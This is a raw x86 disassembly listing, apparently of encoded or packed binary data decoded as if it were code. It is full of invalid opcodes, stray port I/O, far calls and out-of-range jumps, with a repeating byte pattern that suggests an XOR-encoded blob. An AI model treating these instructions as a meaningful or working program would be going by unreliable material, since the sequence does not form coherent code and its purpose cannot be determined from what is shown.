  403387:	9a e3 e0 2f 8e b7 9b 	lcall  $0x9bb7,$0x8e2fe0e3
  40338e:	c5 ef 6c             	(bad)
  403391:	75 c5                	jne    0x403358
  403393:	e3 9c                	jecxz  0x403331
  403395:	8b c5                	mov    %ebp,%eax
  403397:	99                   	cltd
  403398:	e9 d9 ce 89 97       	jmp    0x97ca0276
  40339d:	9b                   	fwait
  40339e:	3a 62 68             	cmp    0x68(%edx),%ah
  4033a1:	64 48                	fs dec %eax
  4033a3:	b6 97                	mov    $0x97,%dh
  4033a5:	61                   	popa
  4033a6:	3a c7                	cmp    %bh,%al
  4033a8:	2a 64 d3 48          	sub    0x48(%ebx,%edx,8),%ah
  4033ac:	94                   	xchg   %eax,%esp
  4033ad:	9b                   	fwait
  4033ae:	c5 e6 ed             	(bad)
  4033b1:	97                   	xchg   %eax,%edi
  4033b2:	d5 99                	aad    $0x99
  4033b4:	97                   	xchg   %eax,%edi
  4033b5:	65 35 d0 ed 97 d5    	gs xor $0xd597edd0,%eax
  4033bb:	99                   	cltd
  4033bc:	97                   	xchg   %eax,%edi
  4033bd:	0f fa 78 e8          	psubd  -0x18(%eax),%mm7
  4033c1:	58                   	pop    %eax
  4033c2:	3f                   	aas
  4033c3:	0c c0                	or     $0xc0,%al
  4033c5:	26 3a 66 67          	cmp    %es:0x67(%esi),%ah
  4033c9:	e1 15                	loope  0x4033e0
  4033cb:	9d                   	popf
  4033cc:	97                   	xchg   %eax,%edi
  4033cd:	9b                   	fwait
  4033ce:	65 38 33             	cmp    %dh,%gs:(%ebx)
  4033d1:	ad                   	lods   %ds:(%esi),%eax
  4033d2:	f9                   	stc
  4033d3:	33 e1                	xor    %ecx,%esp
  4033d5:	81 b9 8a 5c 37 6c 31 	cmpl   $0x3239e331,0x6c375c8a(%ecx)
  4033dc:	e3 39 32 
  4033df:	a1 2d 9c ca 7d       	mov    0x7dca9c2d,%eax
  4033e4:	a8 13                	test   $0x13,%al
  4033e6:	bb 0b 90 cd 78       	mov    $0x78cd900b,%ebx
  4033eb:	66 68 a2 7f          	pushw  $0x7fa2
  4033ef:	99                   	cltd
  4033f0:	69 e9 47 81 e5 51    	imul   $0x51e58147,%ecx,%ebp
  4033f6:	3a cc                	cmp    %ah,%cl
  4033f8:	2a 64 83 77          	sub    0x77(%ebx,%eax,4),%ah
  4033fc:	68 64 3a 95 cc       	push   $0xcc953a64
  403401:	e5 7f                	in     $0x7f,%eax
  403403:	9e                   	sahf
  403404:	fb                   	sti
  403405:	7f 3a                	jg     0x403441
  403407:	66 e5 19             	in     $0x19,%ax
  40340a:	e2 eb                	loop   0x4033f7
  40340c:	5d                   	pop    %ebp
  40340d:	75 90                	jne    0x40339f
  40340f:	24 68                	and    $0x68,%al
  403411:	dd 35 66 68 64 c9    	fnsave 0xc9646866
  403417:	c2 e5 19             	ret    $0x19e5
  40341a:	eb eb                	jmp    0x403407
  40341c:	5d                   	pop    %ebp
  40341d:	44                   	inc    %esp
  40341e:	90                   	nop
  40341f:	24 68                	and    $0x68,%al
  403421:	dd 3d 66 68 64 c9    	fnstsw 0xc9646866
  403427:	c2 e8 5f             	ret    $0x5fe8
  40342a:	5d                   	pop    %ebp
  40342b:	13 67 27             	adc    0x27(%edi),%esp
  40342e:	b1 23                	mov    $0x23,%cl
  403430:	90                   	nop
  403431:	ed                   	in     (%dx),%eax
  403432:	f8                   	clc
  403433:	67 aa                	stos   %al,%es:(%di)
  403435:	ed                   	in     (%dx),%eax
  403436:	6f                   	outsl  %ds:(%esi),(%dx)
  403437:	9e                   	sahf
  403438:	e8 21 c5 67 ae       	call   0xaea7f95e
  40343d:	21 c4                	and    %eax,%esp
  40343f:	66 83 72 b0 65       	xorw   $0x65,-0x50(%edx)
  403444:	67 d2 6f 98          	shrb   %cl,-0x68(%bx)
  403448:	52                   	push   %edx
  403449:	20 2f                	and    %ch,(%edi)
  40344b:	81 1d 62 ba 23 97 60 	sbbl   $0xe86cd160,0x9723ba62
  403452:	d1 6c e8 
  403455:	21 c4                	and    %eax,%esp
  403457:	67 e8 19 c4 77 1a    	addr16 call 0x1ab7f876
  40345d:	80 b1 23 90 ed f8 57 	xorb   $0x57,-0x7126fdd(%ecx)
  403464:	aa                   	stos   %al,%es:(%edi)
  403465:	ed                   	in     (%dx),%eax
  403466:	6f                   	outsl  %ds:(%esi),(%dx)
  403467:	9e                   	sahf
  403468:	ae                   	scas   %es:(%edi),%al
  403469:	21 c7                	and    %eax,%edi
  40346b:	66 81 c4 3a 66       	add    $0x663a,%sp
  403470:	68 ee 39 69 de       	push   $0xde6939ee
  403475:	31 c7                	xor    %eax,%edi
  403477:	5c                   	pop    %esp
  403478:	2c 71                	sub    $0x71,%al
  40347a:	e2 69                	loop   0x4034e5
  40347c:	ed                   	in     (%dx),%eax
  40347d:	e8 3a 66 68 e4       	call   0xe4a89abc
  403482:	7f 99                	jg     0x40341d
  403484:	69 e5 4f 9e cf 54    	imul   $0x54cf9e4f,%ebp,%esp
  40348a:	3a 66 67             	cmp    0x67(%esi),%ah
  40348d:	d2 79 67             	sarb   %cl,0x67(%ecx)
  403490:	55                   	push   %ebp
  403491:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403492:	3a 66 68             	cmp    0x68(%esi),%ah
  403495:	19 58 69             	sbb    %ebx,0x69(%eax)
  403498:	de 27                	fisubs (%edi)
  40349a:	3b 43 a8             	cmp    -0x58(%ebx),%eax
  40349d:	64 3a 66 eb          	cmp    %fs:-0x15(%esi),%ah
  4034a1:	9c                   	pushf
  4034a2:	7a 13                	jp     0x4034b7
  4034a4:	6c                   	insb   (%dx),%es:(%edi)
  4034a5:	e4 7f                	in     $0x7f,%al
  4034a7:	99                   	cltd
  4034a8:	69 6b 8c 25 69 ed f8 	imul   $0xf8ed6925,-0x74(%ebx),%ebp
  4034af:	e5 8a                	in     $0x8a,%eax
  4034b1:	63 b9 9c 6c 10 30    	arpl   %edi,0x30106c9c(%ecx)
  4034b7:	e5 92                	in     $0x92,%eax
  4034b9:	61                   	popa
  4034ba:	4f                   	dec    %edi
  4034bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4034bc:	eb 9c                	jmp    0x40345a
  4034be:	7a 1b                	jp     0x4034db
  4034c0:	6c                   	insb   (%dx),%es:(%edi)
  4034c1:	e4 7f                	in     $0x7f,%al
  4034c3:	99                   	cltd
  4034c4:	69 6b 8c 25 69 92 79 	imul   $0x79926925,-0x74(%ebx),%ebp
  4034cb:	67 a8 11             	addr16 test $0x11,%al
  4034ce:	36 e5 88             	ss in  $0x88,%eax
  4034d1:	63 b9 9e 6d 11 3e    	arpl   %edi,0x3e116d9e(%ecx)
  4034d7:	e6 2d                	out    %al,$0x2d
  4034d9:	9b                   	fwait
  4034da:	39 69 de             	cmp    %ebp,-0x22(%ecx)
  4034dd:	27                   	daa
  4034de:	3b 43 a8             	cmp    -0x58(%ebx),%eax
  4034e1:	64 3a 66 55          	cmp    %fs:0x55(%esi),%ah
  4034e5:	e4 3a                	in     $0x3a,%al
  4034e7:	66 68 11 3e          	pushw  $0x3e11
  4034eb:	e6 2d                	out    %al,$0x2d
  4034ed:	9b                   	fwait
  4034ee:	3e ed                	ds in  (%dx),%eax
  4034f0:	2d 9c b3 a4 59       	sub    $0x59a4b39c,%eax
  4034f5:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4034f6:	b3 33                	mov    $0x33,%bl
  4034f8:	90                   	nop
  4034f9:	6b 8c 65 55 93 3a 66 	imul   $0x68,0x663a9355(%ebp,%eiz,2),%ecx
  403500:	68 
  403501:	11 30                	adc    %esi,(%eax)
  403503:	90                   	nop
  403504:	2b 65 02             	sub    0x2(%ebp),%esp
  403507:	13 6c e4 7f          	adc    0x7f(%esp,%eiz,8),%ebp
  40350b:	99                   	cltd
  40350c:	6c                   	insb   (%dx),%es:(%edi)
  40350d:	e4 7f                	in     $0x7f,%al
  40350f:	9b                   	fwait
  403510:	69 e4 47 9b 67 6b    	imul   $0x6b679b47,%esp,%esp
  403516:	b8 30 97 9b c5       	mov    $0xc59b9730,%eax
  40351b:	a0 2d 98 3a 8d       	mov    0x8d3a982d,%al
  403520:	7e ee                	jle    0x403510
  403522:	39 69 de             	cmp    %ebp,-0x22(%ecx)
  403525:	31 c6                	xor    %eax,%esi
  403527:	5c                   	pop    %esp
  403528:	2c 71                	sub    $0x71,%al
  40352a:	eb 13                	jmp    0x40353f
  40352c:	6e                   	outsb  %ds:(%esi),(%dx)
  40352d:	e4 7f                	in     $0x7f,%al
  40352f:	99                   	cltd
  403530:	69 8f 30 e6 2d 98 3b 	imul   $0x9815e63b,-0x67d219d0(%edi),%ecx
  403537:	e6 15 98 
  40353a:	3d 14 8c dc 0a       	cmp    $0xadc8c14,%eax
  40353f:	5f                   	pop    %edi
  403540:	68 64 cd 03 90       	push   $0x9003cd64
  403545:	ed                   	in     (%dx),%eax
  403546:	7f aa                	jg     0x4034f2
  403548:	e1 21                	loope  0x40356b
  40354a:	c2 69 de             	ret    $0xde69
  40354d:	67 07                	addr16 pop %es
  40354f:	e5 68                	in     $0x68,%eax
  403551:	64 3a 13             	cmp    %fs:(%ebx),%dl
  403554:	6c                   	insb   (%dx),%es:(%edi)
  403555:	e4 7f                	in     $0x7f,%al
  403557:	99                   	cltd
  403558:	69 6b 8c 23 97 3b 64 	imul   $0x643b9723,-0x74(%ebx),%ebp
  40355f:	3d a1 a7 6f ef       	cmp    $0xef6fa7a1,%eax
  403564:	8d 37                	lea    (%edi),%esi
  403566:	6c                   	insb   (%dx),%es:(%edi)
  403567:	31 e3                	xor    %esp,%ebx
  403569:	11 32                	adc    %esi,(%edx)
  40356b:	d9 cf                	fxch   %st(7)
  40356d:	11 de                	adc    %ebx,%esi
  40356f:	72 e1                	jb     0x403552
  403571:	9c                   	pushf
  403572:	13 9e e1 a3 52 99    	adc    -0x66ad5c1f(%esi),%ebx
  403578:	68 64 3a 30 02       	push   $0x2303a64
  40357d:	64 d2 67 2d          	shlb   %cl,%fs:0x2d(%edi)
  403581:	64 3a ef             	fs cmp %bh,%ch
  403584:	99                   	cltd
  403585:	e7 f2                	out    %eax,$0xf2
  403587:	99                   	cltd
  403588:	28 e4                	sub    %ah,%ah
  40358a:	06                   	push   %es
  40358b:	67 68 11 c3 ef af    	addr16 push $0xafefc311
  403591:	8f                   	(bad)
  403592:	34 e6                	xor    $0xe6,%al
  403594:	54                   	push   %esp
  403595:	5a                   	pop    %edx
  403596:	66 13 6f a2          	adc    -0x5e(%edi),%bp
  40359a:	7e 51                	jle    0x4035ed
  40359c:	69 64 d1 60 27 e7 c5 	imul   $0x67c5e727,0x60(%ecx,%edx,8),%esp
  4035a3:	67 
  4035a4:	17                   	pop    %ss
  4035a5:	89 65 38             	mov    %esp,0x38(%ebp)
  4035a8:	33 39                	xor    (%ecx),%edi
  4035aa:	f9                   	stc
  4035ab:	33 e1                	xor    %ecx,%esp
  4035ad:	81 82 66 48 64 3a 8e 	addl   $0x3a20448e,0x3a644866(%edx)
  4035b4:	44 20 3a 
  4035b7:	66 3e 33 85 3b 43 5d 	xor    %ds:0x105d433b(%ebp),%ax
  4035be:	10 
  4035bf:	e7 9f                	out    %eax,$0x9f
  4035c1:	9a 7b 66 68 e9 4f 6a 	lcall  $0x6a4f,$0xe968667b
  4035c8:	e1 9c                	loope  0x403566
  4035ca:	0b 9e e1 a3 6c 99    	or     -0x66935c1f(%esi),%ebx
  4035d0:	1d 6c b7 e3 68       	sbb    $0x68e3b76c,%eax
  4035d5:	84 c5                	test   %al,%ch
  4035d7:	99                   	cltd
  4035d8:	38 8c 34 2f 68 64 b7 	cmp    %cl,-0x489b97d1(%esp,%esi,1)
  4035df:	e3 68                	jecxz  0x403649
  4035e1:	84 c5                	test   %al,%ch
  4035e3:	99                   	cltd
  4035e4:	38 8c 35 66 68 64 b9 	cmp    %cl,-0x469b979a(%ebp,%esi,1)
  4035eb:	a2 78 55 cc e7       	mov    %al,0xe7cc5578
  4035f0:	af                   	scas   %es:(%edi),%eax
  4035f1:	b8 31 66 68 3b       	mov    $0x3b686631,%eax
  4035f6:	64 af                	fs scas %es:(%edi),%eax
  4035f8:	ab                   	stos   %eax,%es:(%edi)
  4035f9:	31 b3 83 3f db d5    	xor    %esi,-0x2a24c07d(%ebx)
  4035ff:	12 d6                	adc    %dh,%dl
  403601:	06                   	push   %es
  403602:	bb a1 e6 4e 3a       	mov    $0x3a4ee6a1,%ebx
  403607:	66 02 64 50 66       	data16 add 0x66(%eax,%edx,2),%ah
  40360c:	97                   	xchg   %eax,%edi
  40360d:	11 32                	adc    %esi,(%edx)
  40360f:	0c 68                	or     $0x68,%al
  403611:	8c 98 20 68 64 65    	mov    %ds,0x65646820(%eax)
  403617:	3b ab 31 b3 83 eb    	cmp    -0x147c4ccf(%ebx),%ebp
  40361d:	88 36                	mov    %dh,(%esi)
  40361f:	35 3e 33 85 28       	xor    $0x2885333e,%eax
  403624:	72 5a                	jb     0x403680
  403626:	06                   	push   %es
  403627:	ef                   	out    %eax,(%dx)
  403628:	90                   	nop
  403629:	55                   	push   %ebp
  40362a:	c2 ef af             	ret    $0xafef
  40362d:	0e                   	push   %cs
  40362e:	3a 0e                	cmp    (%esi),%cl
  403630:	e8 64 3a 66 02       	call   0x2a67099
  403635:	67 50                	addr16 push %eax
  403637:	66 02 67 52          	data16 add 0x52(%edi),%ah
  40363b:	66 68 64 ba          	pushw  $0xba64
  40363f:	99                   	cltd
  403640:	1d 6c d2 47 2d       	sbb    $0x2d47d26c,%eax
  403645:	64 3a ef             	fs cmp %bh,%ch
  403648:	ae                   	scas   %es:(%edi),%al
  403649:	e7 c4                	out    %eax,$0xc4
  40364b:	99                   	cltd
  40364c:	1d 72 b9 1b 64       	sbb    $0x641bb972,%eax
  403651:	64 4e                	fs dec %esi
  403653:	60                   	pusha
  403654:	e3 21                	jecxz  0x403677
  403656:	36 e5 48             	ss in  $0x48,%eax
  403659:	64 0b a6 83 34 bb a1 	or     %fs:-0x5e44cb7d(%esi),%esp
  403660:	14 09                	adc    $0x9,%al
  403662:	3a 66 02             	cmp    0x2(%esi),%ah
  403665:	64 6c                	fs insb (%dx),%es:(%edi)
  403667:	8e 64 20 3a          	mov    0x3a(%eax,%eiz,1),%fs
  40366b:	66 e1 a7             	data16 loope 0x403615
  40366e:	b9 a6 78 34 50       	mov    $0x503478a6,%ecx
  403673:	26 80 af 7e 66 68 ed 	subb   $0x7f,%es:-0x12979982(%edi)
  40367a:	7f 
  40367b:	9a 02 64 b9 1b 64 64 	lcall  $0x6464,$0x1bb96402
  403682:	4e                   	dec    %esi
  403683:	6e                   	outsb  %ds:(%esi),(%dx)
  403684:	e3 21                	jecxz  0x4036a7
  403686:	36 ef                	ss out %eax,(%dx)
  403688:	2d 90 d1 60 e5       	sub    $0xe560d190,%eax
  40368d:	21 c2                	and    %eax,%edx
  40368f:	ef                   	out    %eax,(%dx)
  403690:	2d 90 c5 13 9c       	sub    $0x9c13c590,%eax
  403695:	37                   	aaa
  403696:	c5 13                	lds    (%ebx),%edx
  403698:	94                   	xchg   %eax,%esp
  403699:	32 d2                	xor    %dl,%dl
  40369b:	b3 2c                	mov    $0x2c,%bl
  40369d:	64 3a e7             	fs cmp %bh,%ah
  4036a0:	9f                   	lahf
  4036a1:	1d 17 66 68 32       	sbb    $0x32686617,%eax
  4036a6:	d2 97 2b 64 3a ed    	rclb   %cl,-0x12c59bd5(%edi)
  4036ac:	2d 98 65 38 33       	sub    $0x33386598,%eax
  4036b1:	ad                   	lods   %ds:(%esi),%eax
  4036b2:	f9                   	stc
  4036b3:	33 e1                	xor    %ecx,%esp
  4036b5:	81 6b 35 3e 33 85 3f 	subl   $0x3f85333e,0x35(%ebx)
  4036bc:	4e                   	dec    %esi
  4036bd:	49                   	dec    %ecx
  4036be:	4c                   	dec    %esp
  4036bf:	e5 9f                	in     $0x9f,%eax
  4036c1:	20 50 66             	and    %dl,0x66(%eax)
  4036c4:	00 e4                	add    %ah,%ah
  4036c6:	3a 66 68             	cmp    0x68(%esi),%ah
  4036c9:	0e                   	push   %cs
  4036ca:	3e 0c 68             	ds or  $0x68,%al
  4036cd:	0e                   	push   %cs
  4036ce:	3a 0e                	cmp    (%esi),%cl
  4036d0:	68 64 3a a6 97       	push   $0x97a63a64
  4036d5:	11 32                	adc    %esi,(%edx)
  4036d7:	8e e4                	mov    %esp,%fs
  4036d9:	20 3a                	and    %bh,(%edx)
  4036db:	66 e1 a2             	data16 loope 0x403680
  4036de:	b9 98 97 11 3e       	mov    $0x3e119798,%ecx
  4036e3:	57                   	push   %edi
  4036e4:	a8 8f                	test   $0x8f,%al
  4036e6:	6d                   	insl   (%dx),%es:(%edi)
  4036e7:	e7 87                	out    %eax,$0x87
  4036e9:	ce                   	into
  4036ea:	06                   	push   %es
  4036eb:	66 68 0e 38          	pushw  $0x380e
  4036ef:	0c 68                	or     $0x68,%al
  4036f1:	0e                   	push   %cs
  4036f2:	3a 30                	cmp    (%eax),%dh
  4036f4:	80 f7 7e             	xor    $0x7e,%bh
  4036f7:	66 68 ef 7f          	pushw  $0x7fef
  4036fb:	6a e1                	push   $0xffffffe1
  4036fd:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4036fe:	b9 ae 97 24 ba       	mov    $0xba2497ae,%ecx
  403703:	5a                   	pop    %edx
  403704:	69 64 4f 9f e1 a7 50 	imul   $0x6650a7e1,-0x61(%edi,%ecx,2),%esp
  40370b:	66 
  40370c:	e5 31                	in     $0x31,%eax
  40370e:	c6                   	(bad)
  40370f:	34 3b                	xor    $0x3b,%al
  403711:	9b                   	fwait
  403712:	4f                   	dec    %edi
  403713:	6a 3e                	push   $0x3e
  403715:	8c e4                	mov    %fs,%esp
  403717:	22 68 64             	and    0x64(%eax),%ch
  40371a:	50                   	push   %eax
  40371b:	66 e5 21             	in     $0x21,%ax
  40371e:	c6                   	(bad)
  40371f:	36 02 66 52          	add    %ss:0x52(%esi),%ah
  403723:	0a a4 26 3a 30 80 af 	or     -0x507fcfc6(%esi,%eiz,1),%ah
  40372a:	7e 66                	jle    0x403792
  40372c:	68 e5 fd 10 07       	push   $0x710fde5
  403731:	64 3a 30             	cmp    %fs:(%eax),%dh
  403734:	80 07 79             	addb   $0x79,(%edi)
  403737:	66 68 dc 3b          	pushw  $0x3bdc
  40373b:	66 68 64 65          	pushw  $0x6564
  40373f:	38 33                	cmp    %dh,(%ebx)
  403741:	ad                   	lods   %ds:(%esi),%eax
  403742:	f9                   	stc
  403743:	33 e1                	xor    %ecx,%esp
  403745:	81 6b 30 3f db 25 62 	subl   $0x6225db3f,0x30(%ebx)
  40374c:	99                   	cltd
  40374d:	61                   	popa
  40374e:	bb 89 ee 76 3a       	mov    $0x3a76ee89,%ebx
  403753:	66 02 64 52 e6       	data16 add -0x1a(%edx,%edx,2),%ah
  403758:	68 64 3a 0c 6c       	push   $0x6c0c3a64
  40375d:	0e                   	push   %cs
  40375e:	3a 0c 68             	cmp    (%eax,%ebp,2),%cl
  403761:	0c 3a                	or     $0x3a,%al
  403763:	66 68 a4 c5          	pushw  $0xc5a4
  403767:	13 60 8c             	adc    -0x74(%eax),%esp
  40376a:	c0 25 68 64 b3 a0 eb 	shlb   $0xeb,0xa0b36468
  403771:	9a c5 13 6c 55 fa 8d 	lcall  $0x8dfa,$0x556c13c5
  403778:	45                   	inc    %ebp
  403779:	0e                   	push   %cs
  40377a:	38 0c 68             	cmp    %cl,(%eax,%ebp,2)
  40377d:	0e                   	push   %cs
  40377e:	3a 30                	cmp    (%eax),%dh
  403780:	80 63 7e 66          	andb   $0x66,0x7e(%ebx)
  403784:	68 ed c2 67 90       	push   $0x9067c2ed
  403789:	ed                   	in     (%dx),%eax
  40378a:	fd                   	std
  40378b:	0c 68                	or     $0x68,%al
  40378d:	e9 7f 9a 38 9b       	jmp    0x9b78d211
  403792:	4f                   	dec    %edi
  403793:	76 97                	jbe    0x40372c
  403795:	11 36                	adc    %esi,(%esi)
  403797:	30 80 3f 7e 66 68    	xor    %al,0x68667e3f(%eax)
  40379d:	32 d2                	xor    %dl,%dl
  40379f:	9f                   	lahf
  4037a0:	2a 64 3a 57          	sub    0x57(%edx,%edi,1),%ah
  4037a4:	a8 24                	test   $0x24,%al
  4037a6:	65 38 a1 a7 6f ef 8d 	cmp    %ah,%gs:-0x72109059(%ecx)
  4037ad:	35 69 30 3f ef       	xor    $0xef3f3069,%eax
  4037b2:	4f                   	dec    %edi
  4037b3:	6e                   	outsb  %ds:(%esi),(%dx)
  4037b4:	af                   	scas   %es:(%edi),%eax
  4037b5:	21 c6                	and    %eax,%esi
  4037b7:	0d 21 dd 69 e7       	or     $0xe769dd21,%eax
  4037bc:	05 98 68 3a 68       	add    $0x683a6898,%eax
  4037c1:	64 0b bd e1 bb d1 61 	or     %fs:0x61d1bbe1(%ebp),%edi
  4037c8:	67 d2 3e 58 69       	sarb   %cl,0x6958
  4037cd:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4037ce:	7d 5d                	jge    0x40382d
  4037d0:	15 68 46 92 3b       	adc    $0x3b924668,%eax
  4037d5:	9b                   	fwait
  4037d6:	4f                   	dec    %edi
  4037d7:	6a 00                	push   $0x0
  4037d9:	31 f6                	xor    %esi,%esi
  4037db:	24 68                	and    $0x68,%al
  4037dd:	8c a8 20 68 64 bb    	mov    %gs,-0x449b97e0(%eax)
  4037e3:	13 94 3c 0e 66 68 0c 	adc    0xc68660e(%esp,%edi,1),%edx
  4037ea:	75 aa                	jne    0x403796
  4037ec:	2a 64 d2 e7          	sub    -0x19(%edx,%edx,8),%ah
  4037f0:	2e 64 3a e5          	cs fs cmp %ch,%ah
  4037f4:	ac                   	lods   %ds:(%esi),%al
  4037f5:	74 0b                	je     0x403802
  4037f7:	bd 83 77 35 d0       	mov    $0xd0357783,%ebp
  4037fc:	6c                   	insb   (%dx),%es:(%edi)
  4037fd:	7a 6a                	jp     0x403869
  4037ff:	0e                   	push   %cs
  403800:	21 a8 78 66 80 0f    	and    %ebp,0xf806678(%eax)
  403806:	7c 66                	jl     0x40386e
  403808:	68 e7 fe 6e 2b       	push   $0x2b6efee7
  40380d:	5f                   	pop    %edi
  40380e:	67 6a 14             	addr16 push $0x14
  403811:	8c 0b                	mov    %cs,(%ebx)
  403813:	99                   	cltd
  403814:	83 6f ba 5a          	subl   $0x5a,-0x46(%edi)
  403818:	56                   	push   %esi
  403819:	64 4f                	fs dec %edi
  40381b:	62 ae 60 04 48 2f    	bound  %ebp,0x2f480460(%esi)
  403821:	5f                   	pop    %edi
  403822:	47                   	inc    %edi
  403823:	6a 14                	push   $0x14
  403825:	94                   	xchg   %eax,%esp
  403826:	6c                   	insb   (%dx),%es:(%edi)
  403827:	0e                   	push   %cs
  403828:	54                   	push   %esp
  403829:	a8 78                	test   $0x78,%al
  40382b:	66 80 27 7c          	data16 andb $0x7c,(%edi)
  40382f:	66 68 e7 fe          	pushw  $0xfee7
  403833:	6e                   	outsb  %ds:(%esi),(%dx)
  403834:	e9 09 c6 9d 51       	jmp    0x51ddfe42
  403839:	64 3a 39             	cmp    %fs:(%ecx),%bh
  40383c:	36 3f                	ss aas
  40383e:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  403840:	3d ed df 37 3b       	cmp    $0x3b37dfed,%eax
  403845:	32 6d ed             	xor    -0x13(%ebp),%ch
  403848:	35 6c b1 13 64       	xor    $0x6413b16c,%eax
  40384d:	a3 7f 9a 25 72       	mov    %eax,0x72259a7f
  403852:	48                   	dec    %eax
  403853:	2a e3                	sub    %bl,%ah
  403855:	21 c6                	and    %eax,%esi
  403857:	ef                   	out    %eax,(%dx)
  403858:	aa                   	stos   %al,%es:(%edi)
  403859:	55                   	push   %ebp
  40385a:	f8                   	clc
  40385b:	ef                   	out    %eax,(%dx)
  40385c:	3d 98 52 29 a4       	cmp    $0xa4295298,%eax
  403861:	26 3a 8e 64 22 3a 66 	cmp    %es:0x663a2264(%esi),%cl
  403868:	31 55 c5             	xor    %edx,-0x3b(%ebp)
  40386b:	8d 7b 6b             	lea    0x6b(%ebx),%edi
  40386e:	8c 62 53             	mov    %fs,0x53(%edx)
  403871:	34 52                	xor    $0x52,%al
  403873:	2f                   	das
  403874:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403875:	26 3a 8e 90 21 3a 66 	cmp    %es:0x663a2190(%esi),%cl
  40387c:	eb a0                	jmp    0x40381e
  40387e:	32 21                	xor    (%ecx),%ah
  403880:	51                   	push   %ecx
  403881:	93                   	xchg   %eax,%ebx
  403882:	48                   	dec    %eax
  403883:	8f e9 21 c6          	(bad)
  403887:	ef                   	out    %eax,(%dx)
  403888:	0a 64 3a 0e          	or     0xe(%edx,%edi,1),%ah
  40388c:	52                   	push   %edx
  40388d:	a8 78                	test   $0x78,%al
  40388f:	66 80 bb 7f 66 68 3d 	data16 cmpb $0x65,0x3d68667f(%ebx)
  403896:	65 
  403897:	38 33                	cmp    %dh,(%ebx)
  403899:	ad                   	lods   %ds:(%esi),%eax
  40389a:	f9                   	stc
  40389b:	33 e1                	xor    %ecx,%esp
  40389d:	81 b9 8a 40 37 6c 31 	cmpl   $0x4ceed331,0x6c37408a(%ecx)
  4038a4:	d3 ee 4c 
  4038a7:	f0 02 e5             	lock add %ch,%ah
  4038aa:	f9                   	stc
  4038ab:	05 3d 64 3a 00       	add    $0x3a643d,%eax
  4038b0:	af                   	scas   %es:(%edi),%eax
  4038b1:	21 d8                	and    %ebx,%eax
  4038b3:	67 68 e7 5f 8a 68    	addr16 push $0x688a5fe7
  4038b9:	e7 5f                	out    %eax,$0x5f
  4038bb:	8e 68 e7             	mov    -0x19(%eax),%gs
  4038be:	5f                   	pop    %edi
  4038bf:	82 68 e9 47          	subb   $0x47,-0x17(%eax)
  4038c3:	94                   	xchg   %eax,%esp
  4038c4:	e5 51                	in     $0x51,%eax
  4038c6:	1d cc 2a 64 83       	sbb    $0x83642acc,%eax
  4038cb:	65 68 64 3a 95 cd    	gs push $0xcd953a64
  4038d1:	ed                   	in     (%dx),%eax
  4038d2:	e2 57                	loop   0x40392b
  4038d4:	b0 ed                	mov    $0xed,%al
  4038d6:	f9                   	stc
  4038d7:	e6 15                	out    %al,$0x15
  4038d9:	74 3b                	je     0x403916
  4038db:	13 6e 02             	adc    0x2(%esi),%ebp
  4038de:	fd                   	std
  4038df:	23 8a 7c 3a ed 2d    	and    0x2ded3a7c(%edx),%ecx
  4038e5:	6c                   	insb   (%dx),%es:(%edi)
  4038e6:	35 d1 28 66 b2       	xor    $0xb26628d1,%eax
  4038eb:	23 97 8f 1c ef b0    	and    -0x4f10e371(%edi),%edx
  4038f1:	93                   	xchg   %eax,%ebx
  4038f2:	d9 ef                	(bad)
  4038f4:	2d b8 b3 a5 67       	sub    $0x67a5b3b8,%eax
  4038f9:	d2 7f 99             	sarb   %cl,-0x67(%edi)
  4038fc:	67 d2 7e 63          	sarb   %cl,0x63(%bp)
  403900:	99                   	cltd
  403901:	e7 fa                	out    %eax,$0xfa
  403903:	78 69                	js     0x40396e
  403905:	21 d6                	and    %edx,%esi
  403907:	e6 15                	out    %al,$0x15
  403909:	9b                   	fwait
  40390a:	38 13                	cmp    %dl,(%ebx)
  40390c:	6c                   	insb   (%dx),%es:(%edi)
  40390d:	e7 57                	out    %eax,$0x57
  40390f:	8a 6a e4             	mov    -0x1c(%edx),%ch
  403912:	57                   	push   %edi
  403913:	99                   	cltd
  403914:	69 e4 47 99 68 11    	imul   $0x11689947,%esp,%esp
  40391a:	ee                   	out    %al,(%dx)
  40391b:	ef                   	out    %eax,(%dx)
  40391c:	b0 93                	mov    $0x93,%al
  40391e:	d9 ef                	(bad)
  403920:	2d b8 b3 a5 e3       	sub    $0xe3a5b3b8,%eax
  403925:	21 36                	and    %esi,(%esi)
  403927:	69 df 24 38 ee 2d    	imul   $0x2dee3824,%edi,%ebx
  40392d:	9a d1 45 67 d2 7f 98 	lcall  $0x987f,$0xd26745d1
  403934:	67 d2 7e 63          	sarb   %cl,0x63(%bp)
  403938:	99                   	cltd
  403939:	e7 fa                	out    %eax,$0xfa
  40393b:	78 69                	js     0x4039a6
  40393d:	21 d2                	and    %edx,%edx
  40393f:	e6 15                	out    %al,$0x15
  403941:	9a 38 13 6c e7 57 8e 	lcall  $0x8e57,$0xe76c1338
  403948:	6a ed                	push   $0xffffffed
  40394a:	e2 4f                	loop   0x40399b
  40394c:	b0 ed                	mov    $0xed,%al
  40394e:	f9                   	stc
  40394f:	e6 05                	out    %al,$0x5
  403951:	9a 3b e6 15 9a 3a 13 	lcall  $0x133a,$0x9a15e63b
  403958:	bf ef 7f 6a 67       	mov    $0x676a7fef,%edi
  40395d:	d3 3a                	sarl   %cl,(%edx)
  40395f:	ed                   	in     (%dx),%eax
  403960:	3d 6c 35 d1 7a       	cmp    $0x7ad1356c,%eax
  403965:	4d                   	dec    %ebp
  403966:	ea 0f a8 09 3b 66 68 	ljmp   $0x6866,$0x3b09a80f
  40396d:	6b 8d 33 8a 6b 95 a4 	imul   $0xffffffa4,-0x6a9475cd(%ebp),%ecx
  403974:	69 21 de ef b0 65    	imul   $0x65b0efde,(%ecx),%esp
  40397a:	e2 ef                	loop   0x40396b
  40397c:	ab                   	stos   %eax,%es:(%edi)
  40397d:	ef                   	out    %eax,(%dx)
  40397e:	77 8e                	ja     0x40390e
  403980:	e1 ac                	loope  0x40392e
  403982:	11 23                	adc    %esp,(%ebx)
  403984:	84 6b 8d             	test   %ch,-0x73(%ebx)
  403987:	2b 8a 93 db ef 2d    	sub    0x2defdb93(%edx),%ecx
  40398d:	bc 3b 23 8c ef       	mov    $0xef8c233b,%esp
